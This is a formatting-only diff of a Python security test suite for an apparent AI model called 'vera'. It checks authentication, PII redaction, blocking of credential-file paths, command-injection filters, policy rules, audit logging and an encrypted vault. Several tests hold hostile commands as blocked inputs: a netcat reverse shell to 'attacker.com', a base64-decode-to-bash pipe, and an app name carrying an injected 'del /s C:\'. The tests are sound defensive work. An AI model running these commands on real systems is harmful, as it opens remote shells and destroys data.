@@ -14,12 +14,14 @@ import pytest
 # 1. AUTHENTICATION & AUTHORIZATION
 # ============================================================
 
+
 class TestAuthentication:
     """Verify authentication cannot be bypassed."""
 
     def test_api_key_empty_means_no_auth(self):
         """When API key is empty, auth is not enforced (local-only mode)."""
         from config import settings
+
         # Default has no API key — acceptable for localhost
         assert settings.server.api_key == ""
 
@@ -28,6 +30,7 @@ class TestAuthentication:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -41,6 +44,7 @@ class TestAuthentication:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -53,6 +57,7 @@ class TestAuthentication:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -63,6 +68,7 @@ class TestAuthentication:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -73,6 +79,7 @@ class TestAuthentication:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -86,6 +93,7 @@ class TestAuthentication:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -98,11 +106,13 @@ class TestAuthentication:
 # 2. DATA LEAK PREVENTION
 # ============================================================
 
+
 class TestDataLeakPrevention:
     """Ensure sensitive data cannot be leaked."""
 
     def test_pii_ssn_redacted(self):
         from vera.safety.privacy import PrivacyGuard
+
         pg = PrivacyGuard()
         result = pg.anonymize("My SSN is 123-45-6789 and phone is 555-123-4567")
         assert "123-45-6789" not in result
@@ -111,18 +121,21 @@ class TestDataLeakPrevention:
 
     def test_pii_credit_card_redacted(self):
         from vera.safety.privacy import PrivacyGuard
+
         pg = PrivacyGuard()
         result = pg.anonymize("Card: 4111-1111-1111-1111")
         assert "4111" not in result
 
     def test_pii_email_redacted(self):
         from vera.safety.privacy import PrivacyGuard
+
         pg = PrivacyGuard()
         result = pg.anonymize("Email me at secret@company.com")
         assert "secret@company.com" not in result
 
     def test_sensitive_keywords_force_local(self):
         from vera.safety.privacy import PrivacyGuard
+
         pg = PrivacyGuard()
         assert pg.should_process_locally("my password is abc123")
         assert pg.should_process_locally("here's my api key")
@@ -136,6 +149,7 @@ class TestDataLeakPrevention:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -151,26 +165,31 @@ class TestDataLeakPrevention:
 # 3. PATH TRAVERSAL PREVENTION
 # ============================================================
 
+
 class TestPathTraversal:
     """Ensure file operations cannot escape sandboxed directories."""
 
     def test_blocks_ssh_keys(self):
         from vera.brain.agents.coder import _is_path_safe
+
         safe, _ = _is_path_safe(Path.home() / ".ssh" / "id_rsa")
         assert not safe
 
     def test_blocks_aws_credentials(self):
         from vera.brain.agents.coder import _is_path_safe
+
         safe, _ = _is_path_safe(Path.home() / ".aws" / "credentials")
         assert not safe
 
     def test_blocks_gnupg(self):
         from vera.brain.agents.coder import _is_path_safe
+
         safe, _ = _is_path_safe(Path.home() / ".gnupg" / "private-keys-v1.d")
         assert not safe
 
     def test_blocks_env_files(self):
         from vera.brain.agents.coder import _is_path_safe
+
         safe, _ = _is_path_safe(Path.home() / "project" / ".env")
         assert not safe
         safe2, _ = _is_path_safe(Path.home() / ".env.local")
@@ -178,6 +197,7 @@ class TestPathTraversal:
 
     def test_allows_safe_paths(self):
         from vera.brain.agents.coder import _is_path_safe
+
         safe, _ = _is_path_safe(Path.home() / "Documents" / "notes.txt")
         assert safe
         safe2, _ = _is_path_safe(Path.cwd() / "README.md")
@@ -186,6 +206,7 @@ class TestPathTraversal:
     @pytest.mark.asyncio
     async def test_read_tool_blocks_ssh(self):
         from vera.brain.agents.coder import ReadFileTool
+
         tool = ReadFileTool()
         result = await tool.execute(path=str(Path.home() / ".ssh" / "id_rsa"))
         assert result["status"] == "error"
@@ -194,6 +215,7 @@ class TestPathTraversal:
     @pytest.mark.asyncio
     async def test_write_tool_blocks_env(self):
         from vera.brain.agents.coder import WriteFileTool
+
         tool = WriteFileTool()
         result = await tool.execute(
             path=str(Path.home() / "project" / ".env"),
@@ -206,12 +228,14 @@ class TestPathTraversal:
 # 4. COMMAND INJECTION PREVENTION
 # ============================================================
 
+
 class TestCommandInjection:
     """Ensure shell commands cannot be injected."""
 
     @pytest.mark.asyncio
     async def test_blocks_rm_rf_variants(self):
         from vera.brain.agents.operator import ExecuteScriptTool
+
         tool = ExecuteScriptTool()
 
         dangerous = [
@@ -227,6 +251,7 @@ class TestCommandInjection:
     @pytest.mark.asyncio
     async def test_blocks_windows_delete(self):
         from vera.brain.agents.operator import ExecuteScriptTool
+
         tool = ExecuteScriptTool()
 
         dangerous = [
@@ -241,6 +266,7 @@ class TestCommandInjection:
     @pytest.mark.asyncio
     async def test_blocks_pipe_to_shell(self):
         from vera.brain.agents.operator import ExecuteScriptTool
+
         tool = ExecuteScriptTool()
 
         dangerous = [
@@ -256,6 +282,7 @@ class TestCommandInjection:
     @pytest.mark.asyncio
     async def test_blocks_base64_decode_pipe(self):
         from vera.brain.agents.operator import ExecuteScriptTool
+
         tool = ExecuteScriptTool()
 
         result = await tool.execute(command="echo abc | base64 -d | bash")
@@ -264,6 +291,7 @@ class TestCommandInjection:
     @pytest.mark.asyncio
     async def test_blocks_system_commands(self):
         from vera.brain.agents.operator import ExecuteScriptTool
+
         tool = ExecuteScriptTool()
 
         dangerous = ["shutdown /s", "reboot", "halt", "init 0"]
@@ -274,6 +302,7 @@ class TestCommandInjection:
     @pytest.mark.asyncio
     async def test_blocks_netcat_reverse_shell(self):
         from vera.brain.agents.operator import ExecuteScriptTool
+
         tool = ExecuteScriptTool()
 
         result = await tool.execute(command="nc -e /bin/bash attacker.com 4444")
@@ -282,6 +311,7 @@ class TestCommandInjection:
     @pytest.mark.asyncio
     async def test_allows_safe_commands(self):
         from vera.brain.agents.operator import ExecuteScriptTool
+
         tool = ExecuteScriptTool()
 
         result = await tool.execute(command="echo hello", language="shell")
@@ -290,6 +320,7 @@ class TestCommandInjection:
     @pytest.mark.asyncio
     async def test_app_name_injection_blocked(self):
         from vera.brain.agents.operator import OpenAppTool
+
         tool = OpenAppTool()
 
         result = await tool.execute(app_name="calc & del /s C:\\")
@@ -306,23 +337,27 @@ class TestCommandInjection:
 # 5. POLICY ENGINE
 # ============================================================
 
+
 class TestPolicyEngine:
     """Verify safety policy rules are enforced."""
 
     def test_money_transfer_always_denied(self):
         from vera.safety.policy import PolicyAction, PolicyService
+
         ps = PolicyService()
         result = ps.check("income", "transfer_money")
         assert result.action == PolicyAction.DENY
 
     def test_delete_all_always_denied(self):
         from vera.safety.policy import PolicyAction, PolicyService
+
         ps = PolicyService()
         result = ps.check("operator", "delete_all")
         assert result.action == PolicyAction.DENY
 
     def test_destructive_ops_need_confirmation(self):
         from vera.safety.policy import PolicyAction, PolicyService
+
         ps = PolicyService()
 
         confirm_ops = [
@@ -346,6 +381,7 @@ class TestPolicyEngine:
 
     def test_safe_ops_allowed(self):
         from vera.safety.policy import PolicyAction, PolicyService
+
         ps = PolicyService()
 
         allowed_ops = [
@@ -366,6 +402,7 @@ class TestPolicyEngine:
 
     def test_unknown_ops_default_to_confirm(self):
         from vera.safety.policy import PolicyAction, PolicyService
+
         ps = PolicyService()
         result = ps.check("unknown_agent", "unknown_tool")
         assert result.action == PolicyAction.CONFIRM
@@ -375,6 +412,7 @@ class TestPolicyEngine:
 # 6. AUDIT LOGGING
 # ============================================================
 
+
 class TestAuditLogging:
     """Verify all security events are logged."""
 
@@ -383,6 +421,7 @@ class TestAuditLogging:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -398,6 +437,7 @@ class TestAuditLogging:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -412,6 +452,7 @@ class TestAuditLogging:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -426,6 +467,7 @@ class TestAuditLogging:
 
         import vera.rbac as rbac_mod
         from vera.rbac import RBACManager
+
         with tempfile.TemporaryDirectory() as tmp:
             rbac_mod.RBAC_DIR = Path(tmp) / "rbac"
             rm = RBACManager()
@@ -440,6 +482,7 @@ class TestAuditLogging:
 # 7. ENCRYPTED STORAGE
 # ============================================================
 
+
 class TestEncryptedStorage:
     """Verify sensitive data is encrypted at rest."""
 
@@ -447,6 +490,7 @@ class TestEncryptedStorage:
         import tempfile
 
         from vera.memory.secure import SecureVault
+
         with tempfile.TemporaryDirectory() as tmp:
             vault_path = Path(tmp) / "vault.enc"
             vault = SecureVault(vault_path=vault_path)
@@ -463,6 +507,7 @@ class TestEncryptedStorage:
         import tempfile
 
         from vera.memory.secure import SecureVault
+
         with tempfile.TemporaryDirectory() as tmp:
             vault_path = Path(tmp) / "vault.enc"
 
@@ -478,6 +523,7 @@ class TestEncryptedStorage:
         import tempfile
 
         from vera.memory.secure import SecureVault
+
         with tempfile.TemporaryDirectory() as tmp:
             vault = SecureVault(vault_path=Path(tmp) / "vault.enc")
             vault.store("to_delete", "value")
